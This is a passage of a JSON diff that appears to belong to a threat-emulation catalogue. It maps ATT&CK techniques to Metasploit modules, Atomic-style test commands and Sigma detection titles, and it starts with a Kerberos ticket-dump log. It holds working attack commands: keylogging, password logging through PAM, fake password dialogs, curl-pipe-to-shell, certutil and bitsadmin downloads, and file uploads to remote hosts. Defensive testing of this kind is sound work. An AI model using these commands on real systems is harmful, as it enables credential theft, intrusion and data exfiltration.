9hihpvHyMXJTKGTDvp6rkehWIC8G5/7XPcaeSuX6yKGUA6o6QaeTBLeiOHDH45AcapY12doQpxf7COrt31+U5xH6BxWwosp+I+axdf9cV63Z4lt2BToP5RZJvTIHe2gpn2trIuo40xkEQEMLKyvsI1frRG9hecUJzSXWXvTIkAwim54SY3rVcs6I6KUulNPyvXw2XVFCGSEb8XLfpl8zc3+gv7MB9Yv6T74M4rcF0guo62vQ==\n[*]   Ticket[1]\n[*]     TGT MIT Credential Cache ticket saved to /home/smcintyre/.msf4/loot/20230823135508_default_192.168.159.10_mit.kerberos.cca_938606.bin\n        Primary Principal: DC$@MSFLAB.LOCAL\n        Ccache version: 4\n        \n        Creds: 1\n          Credential[0]:\n            Server: krbtgt/MSFLAB.LOCAL@MSFLAB.LOCAL\n            Client: DC$@MSFLAB.LOCAL\n            Ticket etype: 18 (AES256)\n            Key: b5c64f9aa85e1e31c9b17a28093bb39de235beeca53d844e10bbf4764cf7402e\n            Subkey: false\n            Ticket Length: 1006\n            Ticket Flags: 0x40e10000 (FORWARDABLE, RENEWABLE, INITIAL, PRE_AUTHENT, CANONICALIZE)\n            Addresses: 0\n            Authdatas: 0\n            Times:\n              Auth time: 1969-12-31 19:00:00 -0500\n              Start time: 2023-08-23 09:32:46 -0400\n              End time: 2023-08-23 19:32:46 -0400\n              Renew Till: 2023-08-30 09:32:46 -0400\n            Ticket:\n              Ticket Version Number: 5\n              Realm: MSFLAB.LOCAL\n              Server Name: krbtgt/MSFLAB.LOCAL\n              Encrypted Ticket Part:\n                Ticket etype: 18 (AES256)\n                Key Version Number: 2\n                Cipher:\n                  a5YMKhDbytSNzz+IqsxyXBURXqaCyVIpWDHu4E1wh0Q9MIVTXn163vkGYUz0X4LuxanqMXwttX8PdYI2V/Lxx6JcPzB50Jt0q4ffw0hsE/swVYEuRI8PyZl13DxE0wlGoaps9GC4l3xZM4nbqiAkPFneJQzrYgXcBWZ6ZlxJlQyGx7hOJLcsdU2KkqNOH8kRZrL/wkKNVKfHkDIkNPSkmYdSweZzuVce7v+yeNBOJpvK4odoE8ldWR6fhOGh5uSj5Fe2G+6ZG1IZREvnxMsqWQ/Ms3Os+1ZLZfH9l6sVi59MHufw98wxMFrKOBrceP0LkThwT29WXO3K3oCojYrSwLznMRKbKnUITRqzKT45a1wB/F556f4ova1GhUAmmlF7SxkGRlDuzh6c8zuKr91gaMQnzd1R95QSDl5xMP4HvWtz0N4bryhez8VbLlnUIFPdrhXtpOpp8Gp8cvEedwnmEmS7AUZyag8ohP40EgvtTXy8No8wuw0/imgIIhmRWlOvsTzUbRpoFMsNHS9h0+s6QhOyQdffMwqGea5c7inLpzJ2LofERlCvNrXVJpJ/+rkPGJasHzcnB216cFnSYuOUYzwIl9nSg1FY5jeOOOj5bcKptUuJonwldq/KJRKWq9io2bEJwOVwteBfRbz+E2KKShjWWMxS0sYhKLG1ZOUZtdLcUfwrwajexlJxM1aV48Y5yvDz7WWdxCOhNRmrjx2qmnOmbCNLgigJByqtcsUmeftfEZte5bdIWGECXOGFLsOdaLtUbW1mRPxDxHRuwTkcB4huzbtUk31pkljGDXp6LXUFOJD/IpJ3PNR6Xcf7jQ60QIkj99wT8xUHcNgJE/I9p8p5Y5EhgsY0KQOMu/OrFD0ah/VXoAl6vOS7INZXRrdVUFchBNKnRBX8aFBnIJ9pNjn1eLdGOrlpcd6HwCz9pCh9yJVs5kjxJWhOoyhOWWtNv/aghw0xPrvMTOTk8YRqe29hihpvHyMXJTKGTDvp6rkehWIC8G5/7XPcaeSuX6yKGUA6o6QaeTBLeiOHDH45AcapY12doQpxf7COrt31+U5xH6BxWwosp+I+axdf9cV63Z4lt2BToP5RZJvTIHe2gpn2trIuo40xkEQEMLKyvsI1frRG9hecUJzSXWXvTIkAwim54SY3rVcs6I6KUulNPyvXw2XVFCGSEb8XLfpl8zc3+gv7MB9Yv6T74M4rcF0guo62vQ==\n[*] LogonSession LUID: 0x00004ff91 \n[*]   User:                  MSFLAB\\smcintyre\n[*]   Session:               1\n[*]   AuthenticationPackage: Kerberos\n[*]   LogonType:             Interactive (2)\n[*]   LogonTime:             2023-08-23 08:33:18 -0400\n[*]   Ticket[0]\n[*]     TGT MIT Credential Cache ticket saved to /home/smcintyre/.msf4/loot/20230823135509_default_192.168.159.10_mit.kerberos.cca_783228.bin\n        Primary Principal: smcintyre@MSFLAB.LOCAL\n        Ccache version: 4\n        \n        Creds: 1\n          Credential[0]:\n            Server: krbtgt/MSFLAB.LOCAL@MSFLAB.LOCAL\n            Client: smcintyre@MSFLAB.LOCAL\n            Ticket etype: 18 (AES256)\n            Key: 074bf82534302378dd8d8f911ddab2afbf64b32e8093e4fdd833e683e427c361\n            Subkey: false\n            Ticket Length: 1052\n            Ticket Flags: 0x40e10000 (FORWARDABLE, RENEWABLE, INITIAL, PRE_AUTHENT, CANONICALIZE)\n            Addresses: 0\n            Authdatas: 0\n            Times:\n              Auth time: 1969-12-31 19:00:00 -0500\n              Start time: 2023-08-23 08:33:18 -0400\n              End time: 2023-08-23 18:33:18 -0400\n              Renew Till: 2023-08-30 08:33:18 -0400\n            Ticket:\n              Ticket Version Number: 5\n              Realm: MSFLAB.LOCAL\n              Server Name: krbtgt/MSFLAB.LOCAL\n              Encrypted Ticket Part:\n                Ticket etype: 18 (AES256)\n                Key Version Number: 2\n                Cipher:\n                  oRWAAGpgwUBqsOzC3Xq8U5cNzsuFjB0ZLIgml5HqoGPgRwMtaDs9YIPNGudWsIvu+zl1aAIY6bkw3ltzW4/Ay2IuqQXKAMVnaWhTLWMNYViyPX4lUw5vrOvR6fpshI3tx46aqXNO5hnHPmNg+zAP9nKwXNG4hj3WtdCM3NMaLGShnQhvt9RnN/rEHuOQGn9Uo+3fEO01juPq9PBMJ/HGhe6dLXWFaXUc7OscSTQ5LUTlz+ABdbz2G0wCleEJPJYsQEo0tC1XDcZRcTsMkgbrAxp3H3zQGubEmX3h36Fo2H6ftYT0NsjnU1z/keylopjV6v0aRADUnqfJs+DgevOBDF0Ccy8IRsDdDVlnxr4tK7QwOvFUuIWKEPsLM2eLesNC7yJWnkDyHiFns+PNaz1PSIoD+euNRHFqW+7cPJXro3r84UcEiukKbWrMbrkg/YSQcEr9yGikNuoWSzgYCtbMsSLBRO7JasRcSNL+p4Dc3+E5r2nWRoR9bZTQM4YM72/kzoaXXnXXuPVx2krpohGMNJIHXoQ6drqCNwYcdT/tGMoCY+BLe29/PAtywGK3Hiq3HhbDnQ8t1g63b7CTssT0edrKR72Bv/YveDn3XQ1iKNM4mot+UxGVjrStJTQ6eEp1r3ZTibSvVTn3T5E1Z3ljSyHYhIa8bGlh2Ysk2St3ZEv3emDwDXvPIGovbzkqE7NYQgPlh36siynCV2SUKj1bApWA7erk7fVTyM/swH7OFa+ekZ+J88F02fanFtvrxGOhKOBfYL50UAas5o+32cqgIrPlip6JXe3BZ2fpr71mcZo4YYzUxopFYbox3FdH95HdQVG7PNg93e3+2XvnrkWEc2md+UhYacKvMMBrXzGAz1d+ea/V3Yt2EgZc1WWAWoKVCfw6RUeTQVs2pWjq7j2APjhzjAEa4s543xgmT0jIHZnfkGzTwjM5f5mhj1KeFkff98pEQX+QjjBFnaRDnIkBmzRmAyJNzxjwAhiW/RNxYNYG3UOnpmxxV443vN3wr3e+MFvBG9azFlq36iWs+2jGNUuFTdH6RECf7/tNun+DE622vI1hIaBJLAHMHzdSIt9kLTQ+OzECGjH0QNRHHibwLhyR36UHShr/ei4/PO87kKw+ZVpb0rHNcICaT80MhCIGWLlH5SErAKQe/vOkDgqeLW+keCbZfW8F7QBXc6C9kUpzUQuIII7KvLKskbgwhqPhoVV70x9vFXWG1xSFwzPJdQmDRBanyQ0xoQFhmt2MO6lMRXTpheAAL+uBJOpgYWX5GBA=\n[*] LogonSession LUID: 0x00004d345 \n[*]   User:                  MSFLAB\\DC$\n[*]   Session:               0\n[*]   AuthenticationPackage: Kerberos\n[*]   LogonType:             Network (3)\n[*]   LogonTime:             2023-08-23 08:33:18 -0400\n[*] LogonSession LUID: 0x00004bfb9 \n[*]   User:                  MSFLAB\\DC$\n[*]   Session:               0\n[*]   AuthenticationPackage: Kerberos\n[*]   LogonType:             Network (3)\n[*]   LogonTime:             2023-08-23 08:33:17 -0400\n[*] Post module execution completed\nmsf post(windows/manage/kerberos_tickets) > klist\nKerberos Cache\n==============\nid   host            principal               sname                             issued                     status  path\n--   ----            ---------               -----                             ------                     ------  ----\n398  192.168.159.10  DC$@MSFLAB.LOCAL        krbtgt/MSFLAB.LOCAL@MSFLAB.LOCAL  2023-08-23 08:33:17 -0400  active  /home/smcintyre/.msf4/loot/20230823135453_default_192.168.159.10_mit.kerberos.cca_948767.bin\n399  192.168.159.10  DC$@MSFLAB.LOCAL        krbtgt/MSFLAB.LOCAL@MSFLAB.LOCAL  2023-08-23 08:33:17 -0400  active  /home/smcintyre/.msf4/loot/20230823135459_default_192.168.159.10_mit.kerberos.cca_126280.bin\n400  192.168.159.10  DC$@MSFLAB.LOCAL        krbtgt/MSFLAB.LOCAL@MSFLAB.LOCAL  2023-08-23 08:33:17 -0400  active  /home/smcintyre/.msf4/loot/20230823135505_default_192.168.159.10_mit.kerberos.cca_341258.bin\n401  192.168.159.10  DC$@MSFLAB.LOCAL        krbtgt/MSFLAB.LOCAL@MSFLAB.LOCAL  2023-08-23 08:33:17 -0400  active  /home/smcintyre/.msf4/loot/20230823135505_default_192.168.159.10_mit.kerberos.cca_389858.bin\n404  192.168.159.10  smcintyre@MSFLAB.LOCAL  krbtgt/MSFLAB.LOCAL@MSFLAB.LOCAL  2023-08-23 08:33:18 -0400  active  /home/smcintyre/.msf4/loot/20230823135509_default_192.168.159.10_mit.kerberos.cca_783228.bin\n402  192.168.159.10  DC$@MSFLAB.LOCAL        krbtgt/MSFLAB.LOCAL@MSFLAB.LOCAL  2023-08-23 09:32:46 -0400  active  /home/smcintyre/.msf4/loot/20230823135507_default_192.168.159.10_mit.kerberos.cca_909298.bin\n403  192.168.159.10  DC$@MSFLAB.LOCAL        krbtgt/MSFLAB.LOCAL@MSFLAB.LOCAL  2023-08-23 09:32:46 -0400  active  /home/smcintyre/.msf4/loot/20230823135508_default_192.168.159.10_mit.kerberos.cca_938606.bin\n\nmsf post(windows/manage/kerberos_tickets) >"
+        },
+        {
+          "module_path": "post/multi/gather/unix_kerberos_tickets",
+          "module_type": "post",
+          "base_class": "Msf::Module",
+          "name": "UNIX Gather Kerberos Tickets",
+          "description": "Post Module to obtain all kerberos tickets on the targeted UNIX machine.",
+          "authors": [],
+          "platform": [
+            "linux",
+            "osx",
+            "unix",
+            "solaris",
+            "aix"
+          ],
+          "arch": [],
+          "session_types": [
+            "meterpreter",
+            "shell"
+          ],
+          "privileged": null,
+          "rank": null,
+          "disclosure_date": null,
+          "default_target": null,
+          "cves": [],
+          "urls": [],
+          "edb_ids": [],
+          "msb_ids": [],
+          "osvdb_ids": [],
+          "bid_ids": [],
+          "mitre_techniques": [
+            {
+              "id": "T1558",
+              "name": "Steal Or Forge Kerberos Tickets"
+            },
+            {
+              "id": "T1005",
+              "name": "Data From Local System"
+            }
+          ],
+          "notes": {
+            "stability": [
+              "CRASH_SAFE"
+            ],
+            "side_effects": [
+              "IOC_IN_LOGS"
+            ],
+            "reliability": [],
+            "aka": []
+          },
+          "compat": null,
+          "options": [
+            {
+              "name": "KRB_CONFIG_FILE",
+              "type": "String",
+              "required": true,
+              "default": "/etc/krb5.conf",
+              "description": "The Kerberos config file."
+            },
+            {
+              "name": "VAS_CONFIG_FILE",
+              "type": "String",
+              "required": true,
+              "default": "/etc/opt/quest/vas/vas.conf",
+              "description": "The VASD config file."
+            }
+          ],
+          "advanced_options": [],
+          "commands": [
+            {
+              "executor": "msfconsole",
+              "command": "use post/multi/gather/unix_kerberos_tickets && set KRB_CONFIG_FILE \"/etc/krb5.conf\" && set VAS_CONFIG_FILE \"/etc/opt/quest/vas/vas.conf\" && run",
+              "cleanup": null
+            }
+          ],
+          "has_documentation": true,
+          "scenario_output": ""
+        }
+      ]
+    },
+    {
+      "technique_id": "T1006",
+      "name": "Direct Volume Access",
+      "description": "This test uses PowerShell to open a handle on the drive volume via the `\\\\.\\` [DOS device path specifier](https://docs.microsoft.com/en-us/dotnet/standard/io/file-path-formats#dos-device-paths) and perform direct access read of the first few bytes of the volume.\nOn success, a hex dump of the first 11 bytes of the volume is displayed.\n\nFor a NTFS volume, it should correspond to the following sequence ([NTFS partition boot sector](https://en.wikipedia.org/wiki/NTFS#Partition_Boot_Sector_(VBR))):\n```\n           00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F\n\n00000000   EB 52 90 4E 54 46 53 20 20 20 20                 ëR?NTFS\n```",
+      "platforms": [
+        "windows"
+      ],
+      "commands": [
+        {
+          "executor": "powershell",
+          "command": "$buffer = New-Object byte[] 11\n$handle = New-Object IO.FileStream \"\\\\.\\#{volume}\", 'Open', 'Read', 'ReadWrite'\n$handle.Read($buffer, 0, $buffer.Length)\n$handle.Close()\nFormat-Hex -InputObject $buffer",
+          "cleanup": null
+        },
+        {
+          "executor": "psh",
+          "command": "$buffer = New-Object byte[] 11;\n$handle = New-Object IO.FileStream \"\\\\.\\C:\", 'Open', 'Read', 'ReadWrite';\n$handle.Read($buffer, 0, $buffer.Length);\n$handle.Close();\nFormat-Hex -InputObject $buffer;",
+          "cleanup": null
+        }
+      ],
+      "detection_rules": [
+        {
+          "title": "Potential Defense Evasion Via Raw Disk Access By Uncommon Tools",
+          "logsource": {
+            "product": "windows",
+            "category": "raw_access_thread"
+          },
+          "description": "Detects raw disk access using uncommon tools or tools that are located in suspicious locations (heavy filtering is required), which could indicate possible defense evasion attempts"
+        }
+      ]
+    },
+    {
+      "technique_id": "T1056",
+      "name": "T1056",
+      "description": "",
+      "platforms": [],
+      "commands": [],
+      "detection_rules": [
+        {
+          "title": "DNS Query Request To OneLaunch Update Service",
+          "logsource": {
+            "category": "dns_query",
+            "product": "windows"
+          },
+          "description": "Detects DNS query requests to \"update.onelaunch.com\". This domain is associated with the OneLaunch adware application.\nWhen the OneLaunch application is installed it will attempt to get updates from this domain."
+        }
+      ]
+    },
+    {
+      "technique_id": "T1056.001",
+      "name": "Input Capture: Keylogging",
+      "description": "Utilize PowerShell and external resource to capture keystrokes\n[Payload](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.001/src/Get-Keystrokes.ps1)\nProvided by [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-Keystrokes.ps1)\n\nUpon successful execution, Powershell will execute `Get-Keystrokes.ps1` and output to key.log.",
+      "platforms": [
+        "windows",
+        "linux",
+        "macos"
+      ],
+      "commands": [
+        {
+          "executor": "powershell",
+          "command": "&\"$PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1\" -LogPath #{filepath}",
+          "cleanup": "Remove-Item $env:TEMP\\key.log -ErrorAction Ignore"
+        },
+        {
+          "executor": "sh",
+          "command": "if sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi;\nif sudo test -f /etc/pam.d/system-auth; then sudo cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi;\nsudo touch /tmp/password-auth.bk\nsudo touch /tmp/system-auth.bk sudo echo \"session    required    pam_tty_audit.so\nenable=* log_password\" >> /etc/pam.d/password-auth sudo echo \"session    required    pam_tty_audit.so\nenable=* log_password\" >> /etc/pam.d/system-auth",
+          "cleanup": "sudo cp -f /tmp/password-auth.bk /etc/pam.d/password-auth\nsudo cp -f /tmp/system-auth.bk /etc/pam.d/system-auth"
+        },
+        {
+          "executor": "sh",
+          "command": "PROMPT_COMMAND='history -a >(tee -a ~/.bash_history |logger -t \"$USER[$$] $SSH_CONNECTION \")'\necho \"\\$PROMPT_COMMAND=$PROMPT_COMMAND\"\ntail /var/log/syslog",
+          "cleanup": "unset PROMPT_COMMAND"
+        },
+        {
+          "executor": "sh",
+          "command": "PS2=`logger -t \"$USER\" -f ~/.sh_history`\n$PS2\ntail /var/log/messages",
+          "cleanup": "unset PS2"
+        },
+        {
+          "executor": "bash",
+          "command": "trap 'echo \"$(date +\"%d/%m/%y %H:%M:%S.%s\") $USER $BASH_COMMAND\" >> #{output_file}' DEBUG\necho \"Hello World!\"\ncat #{output_file}",
+          "cleanup": "rm #{output_file}"
+        },
+        {
+          "executor": "sh",
+          "command": "cp -v /etc/pam.d/sshd /tmp/\necho \"session required pam_tty_audit.so disable=* enable=* open_only log_passwd\" >> /etc/pam.d/sshd\nsystemctl restart sshd\nsystemctl restart auditd\nssh #{user_account}@localhost \nwhoami\nsudo su\nwhoami\nexit\nexit",
+          "cleanup": "cp -fv /tmp/sshd /etc/pam.d/"
+        },
+        {
+          "executor": "sh",
+          "command": "auditctl -a always,exit -F arch=b64 -S execve -k CMDS \nauditctl -a always,exit -F arch=b32 -S execve -k CMDS\nwhoami; ausearch -i --start now",
+          "cleanup": "systemctl restart auditd"
+        },
+        {
+          "executor": "bash",
+          "command": "swift #{swift_src} -keylog",
+          "cleanup": "kill `pgrep swift-frontend`"
+        }
+      ],
+      "detection_rules": [
+        {
+          "title": "Powershell Keylogging",
+          "logsource": {
+            "product": "windows",
+            "category": "ps_script",
+            "definition": "Requirements: Script Block Logging must be enabled"
+          },
+          "description": "Adversaries may log user keystrokes to intercept credentials as the user types them."
+        },
+        {
+          "title": "Potential Keylogger Activity",
+          "logsource": {
+            "product": "windows",
+            "category": "ps_script",
+            "definition": "Requirements: Script Block Logging must be enabled"
+          },
+          "description": "Detects PowerShell scripts that contains reference to keystroke capturing functions"
+        }
+      ]
+    },
+    {
+      "technique_id": "T1056.002",
+      "name": "Input Capture: GUI Input Capture",
+      "description": "Prompt User for Password (Local Phishing)\nReference: http://fuzzynop.blogspot.com/2014/10/osascript-for-local-phishing.html",
+      "platforms": [
+        "macos",
+        "windows"
+      ],
+      "commands": [
+        {
+          "executor": "bash",
+          "command": "osascript -e 'tell app \"System Preferences\" to activate' -e 'tell app \"System Preferences\" to activate' -e 'tell app \"System Preferences\" to display dialog \"Software Update requires that you type your password to apply changes.\" & return & return  default answer \"\" with icon 1 with hidden answer with title \"Software Update\"'",
+          "cleanup": null
+        },
+        {
+          "executor": "powershell",
+          "command": "# Creates GUI to prompt for password. Expect long pause before prompt is available.    \n$cred = $host.UI.PromptForCredential('Windows Security Update', '',[Environment]::UserName, [Environment]::UserDomainName)\n# Using write-warning to allow message to show on console as echo and other similar commands are not visable from the Invoke-AtomicTest framework.\nwrite-warning $cred.GetNetworkCredential().Password",
+          "cleanup": null
+        },
+        {
+          "executor": "bash",
+          "command": "PWD_SPOOF=$(osascript -e 'display dialog \"To perform a security update MacOS needs your passphrase.\" with title \"MacOS Security Update\" default answer \"\" with icon stop with hidden answer')\necho $PWD_SPOOF",
+          "cleanup": null
+        }
+      ],
+      "detection_rules": [
+        {
+          "title": "CredUI.DLL Loaded By Uncommon Process",
+          "logsource": {
+            "category": "image_load",
+            "product": "windows"
+          },
+          "description": "Detects loading of \"credui.dll\" and related DLLs by an uncommon process. Attackers might leverage this DLL for potential use of \"CredUIPromptForCredentials\" or \"CredUnPackAuthenticationBufferW\"."
+        },
+        {
+          "title": "PUA - Mouse Lock Execution",
+          "logsource": {
+            "product": "windows",
+            "category": "process_creation"
+          },
+          "description": "In Kaspersky's 2020 Incident Response Analyst Report they listed legitimate tool \"Mouse Lock\" as being used for both credential access and collection in security incidents."
+        }
+      ]
+    },
+    {
+      "technique_id": "T1056.004",
+      "name": "Input Capture: Credential API Hooking",
+      "description": "Hooks functions in PowerShell to read TLS Communications",
+      "platforms": [
+        "windows"
+      ],
+      "commands": [
+        {
+          "executor": "powershell",
+          "command": "mavinject $pid /INJECTRUNNING \"#{file_name}\"\nInvoke-WebRequest #{server_name} -UseBasicParsing",
+          "cleanup": null
+        }
+      ],
+      "detection_rules": []
+    },
+    {
+      "technique_id": "T1074.001",
+      "name": "Data Staged: Local Data Staging",
+      "description": "Utilize powershell to download discovery.bat and save to a local file. This emulates an attacker downloading data collection tools onto the host. Upon execution,\nverify that the file is saved in the temp directory.",
+      "platforms": [
+        "windows",
+        "linux",
+        "macos",
+        "darwin"
+      ],
+      "commands": [
+        {
+          "executor": "powershell",
+          "command": "Invoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat\" -OutFile #{output_file}",
+          "cleanup": "Remove-Item -Force #{output_file} -ErrorAction Ignore"
+        },
+        {
+          "executor": "sh",
+          "command": "curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh | sh -s > #{output_file}",
+          "cleanup": "rm #{output_file}"
+        },
+        {
+          "executor": "powershell",
+          "command": "Compress-Archive -Path \"#{input_file}\" -DestinationPath #{output_file} -Force",
+          "cleanup": "Remove-Item -Path #{output_file} -ErrorAction Ignore"
+        },
+        {
+          "executor": "sh",
+          "command": "cp #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]}",
+          "cleanup": null
+        },
+        {
+          "executor": "psh",
+          "command": "Copy-Item #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]}",
+          "cleanup": null
+        },
+        {
+          "executor": "cmd",
+          "command": "copy #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]}",
+          "cleanup": null
+        },
+        {
+          "executor": "sh",
+          "command": "mkdir -p staged && echo $PWD/staged",
+          "cleanup": "rm -rf staged"
+        },
+        {
+          "executor": "psh,pwsh",
+          "command": "New-Item -Path \".\" -Name \"staged\" -ItemType \"directory\" -Force | foreach {$_.FullName} | Select-Object",
+          "cleanup": "Remove-Item -Path \"staged\" -recurse"
+        }
+      ],
+      "detection_rules": [
+        {
+          "title": "Zip A Folder With PowerShell For Staging In Temp - PowerShell",
+          "logsource": {
+            "product": "windows",
+            "service": "powershell-classic"
+          },
+          "description": "Detects PowerShell scripts that make use of the \"Compress-Archive\" Cmdlet in order to compress folders and files where the output is stored in a potentially suspicious location that is used often by malware for exfiltration.\nAn adversary might compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network."
+        },
+        {
+          "title": "Zip A Folder With PowerShell For Staging In Temp  - PowerShell Module",
+          "logsource": {
+            "product": "windows",
+            "category": "ps_module",
+            "definition": "0ad03ef1-f21b-4a79-8ce8-e6900c54b65b"
+          },
+          "description": "Detects PowerShell scripts that make use of the \"Compress-Archive\" Cmdlet in order to compress folders and files where the output is stored in a potentially suspicious location that is used often by malware for exfiltration.\nAn adversary might compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network."
+        },
+        {
+          "title": "Zip A Folder With PowerShell For Staging In Temp - PowerShell Script",
+          "logsource": {
+            "product": "windows",
+            "category": "ps_script",
+            "definition": "Requirements: Script Block Logging must be enabled"
+          },
+          "description": "Detects PowerShell scripts that make use of the \"Compress-Archive\" Cmdlet in order to compress folders and files where the output is stored in a potentially suspicious location that is used often by malware for exfiltration.\nAn adversary might compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network."
+        },
+        {
+          "title": "Folder Compress To Potentially Suspicious Output Via Compress-Archive Cmdlet",
+          "logsource": {
+            "product": "windows",
+            "category": "process_creation"
+          },
+          "description": "Detects PowerShell scripts that make use of the \"Compress-Archive\" Cmdlet in order to compress folders and files where the output is stored in a potentially suspicious location that is used often by malware for exfiltration.\nAn adversary might compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network."
+        }
+      ]
+    },
+    {
+      "technique_id": "T1105",
+      "name": "Ingress Tool Transfer",
+      "description": "Utilize rsync to perform a remote file copy (push)",
+      "platforms": [
+        "linux",
+        "macos",
+        "windows",
+        "containers"
+      ],
+      "commands": [
+        {
+          "executor": "sh",
+          "command": "rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}",
+          "cleanup": null
+        },
+        {
+          "executor": "sh",
+          "command": "rsync -r #{username}@#{remote_host}:#{remote_path} #{local_path}",
+          "cleanup": null
+        },
+        {
+          "executor": "sh",
+          "command": "scp #{local_file} #{username}@#{remote_host}:#{remote_path}",
+          "cleanup": null
+        },
+        {
+          "executor": "sh",
+          "command": "scp #{username}@#{remote_host}:#{remote_file} #{local_path}",
+          "cleanup": null
+        },
+        {
+          "executor": "bash",
+          "command": "sftp #{username}@#{remote_host}:#{remote_path} <<< $'put #{local_file}'",
+          "cleanup": null
+        },
+        {
+          "executor": "sh",
+          "command": "sftp #{username}@#{remote_host}:#{remote_file} #{local_path}",
+          "cleanup": null
+        },
+        {
+          "executor": "command_prompt",
+          "command": "cmd /c certutil -urlcache -split -f #{remote_file} #{local_path}",
+          "cleanup": "del #{local_path} >nul 2>&1"
+        },
+        {
+          "executor": "powershell",
+          "command": "$datePath = \"certutil-$(Get-Date -format yyyy_MM_dd)\"\nNew-Item -Path $datePath -ItemType Directory\nSet-Location $datePath\ncertutil -verifyctl -split -f #{remote_file}\nGet-ChildItem | Where-Object {$_.Name -notlike \"*.txt\"} | Foreach-Object { Move-Item $_.Name -Destination #{local_path} }",
+          "cleanup": "Remove-Item \"certutil-$(Get-Date -format yyyy_MM_dd)\" -Force -Recurse -ErrorAction Ignore"
+        },
+        {
+          "executor": "command_prompt",
+          "command": "C:\\Windows\\System32\\bitsadmin.exe /transfer #{bits_job_name} /Priority HIGH #{remote_file} #{local_path}",
+          "cleanup": null
+        },
+        {
+          "executor": "powershell",
+          "command": "(New-Object System.Net.WebClient).DownloadFile(\"#{remote_file}\", \"#{destination_path}\")",
+          "cleanup": "Remove-Item #{destination_path} -Force -ErrorAction Ignore"
+        },
+        {
+          "executor": "command_prompt",
+          "command": "pushd #{destination_path}\necho var fileObject = WScript.createobject(\"Scripting.FileSystemObject\");var newfile = fileObject.CreateTextFile(\"AtomicTestFileT1105.js\", true);newfile.WriteLine(\"This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives.\");newfile.Close(); > AtomicTestT1105.js\nCScript.exe AtomicTestT1105.js //E:JScript\ndel AtomicTestT1105.js /Q >nul 2>&1\ndel AtomicTestFileT1105.js /Q >nul 2>&1\npopd",
+          "cleanup": null
+        },
+        {
+          "executor": "command_prompt",
+          "command": "copy C:\\Windows\\System32\\cmd.exe C:\\svchost.exe\nC:\\svchost.exe /c echo T1105 > \\\\localhost\\c$\\T1105.txt",
+          "cleanup": "del C:\\T1105.txt >nul 2>&1\ndel C:\\\\svchost.exe >nul 2>&1"
+        },
+        {
+          "executor": "command_prompt",
+          "command": "cd \"%ProgramData%\\Microsoft\\Windows Defender\\platform\\4.18*\"\nMpCmdRun.exe -DownloadFile -url #{remote_file} -path #{local_path}",
+          "cleanup": "del #{local_path} >nul 2>&1\ndel %temp%\\MpCmdRun.log >nul 2>&1"
+        },
+        {
+          "executor": "sh",
+          "command": "timeout --preserve-status #{timeout} whois -h #{remote_host} -p #{remote_port} \"#{query}\" > #{output_file}",
+          "cleanup": "rm -f #{output_file}"
+        },
+        {
+          "executor": "powershell",
+          "command": "(New-Object Net.WebClient).DownloadString('#{target_remote_file}') | Out-File #{output_file}; Invoke-Item #{output_file}",
+          "cleanup": null
+        },
+        {
+          "executor": "command_prompt",
+          "command": "finger base64_filedata@#{remote_host}",
+          "cleanup": null
+        },
+        {
+          "executor": "powershell",
+          "command": "$imewdbled = $env:SystemRoot + \"\\System32\\IME\\SHARED\\IMEWDBLD.exe\"\n& $imewdbled #{remote_url}",
+          "cleanup": "$inetcache = $env:LOCALAPPDATA + \"\\Microsoft\\Windows\\INetCache\\\" \n$file_to_be_removed = [string[]] (Get-ChildItem -Path $inetcache -Include #{file_name}* -Recurse -Force -File -ErrorAction SilentlyContinue)\nif(\"\" -ne \"$file_to_be_removed\") { Remove-Item \"$file_to_be_removed\" -ErrorAction Ignore }"
+        },
+        {
+          "executor": "command_prompt",
+          "command": "#{curl_path} -k #{file_download} -o c:\\users\\public\\music\\allthethingsx64.dll\n#{curl_path} -k #{file_download} --output c:\\users\\public\\music\\allthethingsx64.dll\n#{curl_path} -k #{file_download} -o c:\\programdata\\allthethingsx64.dll\n#{curl_path} -k #{file_download} -o %Temp%\\allthethingsx64.dll",
+          "cleanup": "del c:\\users\\public\\music\\allthethingsx64.dll >nul 2>&1\ndel c:\\users\\public\\music\\allthethingsx64.dll >nul 2>&1\ndel c:\\programdata\\allthethingsx64.dll >nul 2>&1\ndel %Temp%\\allthethingsx64.dll >nul 2>&1"
+        },
+        {
+          "executor": "command_prompt",
+          "command": "#{curl_path} -T #{file_path} #{remote_destination}\n#{curl_path} --upload-file #{file_path} #{remote_destination}\n#{curl_path} -d #{file_path} #{remote_destination}\n#{curl_path} --data #{file_path} #{remote_destination}",
+          "cleanup": null
+        },
+        {
+          "executor": "command_prompt",
+          "command": "\"#{Path_to_file}\" 1>NUL",
+          "cleanup": "del /f/s/q %temp%\\T1105 >nul 2>&1\nrmdir /s/q %temp%\\T1105 >nul 2>&1"
+        },
+        {
+          "executor": "powershell",
